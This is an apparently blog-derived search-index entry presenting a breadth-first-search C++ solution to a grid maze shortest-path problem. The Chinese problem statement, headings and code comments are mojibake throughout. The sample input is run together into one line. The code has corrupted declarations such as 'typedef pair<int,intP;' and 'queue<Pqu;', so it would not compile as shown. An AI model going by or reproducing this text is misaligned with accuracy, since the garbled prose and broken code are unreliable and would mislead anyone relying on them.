    <content type="html"><![CDATA[<h1 id="è¿·å®«é—®é¢˜"><a href="#è¿·å®«é—®é¢˜" class="headerlink" title="è¿·å®«é—®é¢˜"></a>è¿·å®«é—®é¢˜</h1><a id="more"></a><h2 id="åŸé¢˜"><a href="#åŸé¢˜" class="headerlink" title="åŸé¢˜"></a>åŸé¢˜</h2><p>é¢˜ç›®æè¿°</p><p>å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚<br> å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚</p><p>è¾“å…¥</p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚<br> æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚<br> æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚<br> å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼š<br>â€˜Sâ€™ï¼šèµ·ç‚¹<br>â€˜Eâ€™ï¼šç»ˆç‚¹<br>â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡<br>â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡<br> è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚</p><p>è¾“å‡º</p><p>å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code>15 5s-###-----##---E#------##</code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code>9</code></pre></div><h2 id="è§£å†³ä»£ç "><a href="#è§£å†³ä»£ç " class="headerlink" title="è§£å†³ä»£ç "></a>è§£å†³ä»£ç </h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//è®¡æ­¥æ•°ç»„  è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 </span><span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ </span><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,intP;  <span class="hljs-comment">//åæ ‡</span><span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘</span><span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)ä¸ºèµ·ç‚¹åæ ‡  ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡</span><span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡   ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ </span><span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° </span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));<span class="hljs-built_in">queue</span>&lt;Pqu;qu.push(P(sx,sy));   //å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ de[sx][sy]=0;<span class="hljs-keyword">while</span>(!qu.empty()) &#123;P p=qu.front();   //å–å‡ºé˜Ÿå¤´åæ ‡ qu.pop() ;//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ x=p.first,y=p.second; <span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯ <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=0;i&lt;4;i++)&#123;nx=x+to[0][i];//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ ny=y+to[1][i];<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>) <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ°  æ’é™¤èµ°è¿‡çš„è·¯ </span> &#123;  qu.push(P(nx,ny));  <span class="hljs-comment">//å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ </span> de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//æ­¥æ•°åŠ ä¸€ </span>  &#125;   &#125;&#125;<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ </span><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; &#125; <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> n,i,j;<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;<span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; <span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//è®°å½•èµ·ç‚¹åæ ‡ </span> &#123;sx=i,sy=j; &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'E'</span>)  <span class="hljs-comment">//è®°å½•ç»ˆç‚¹åæ ‡ </span> &#123; ex=i,ey=j; &#125;&#125;&#125;<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
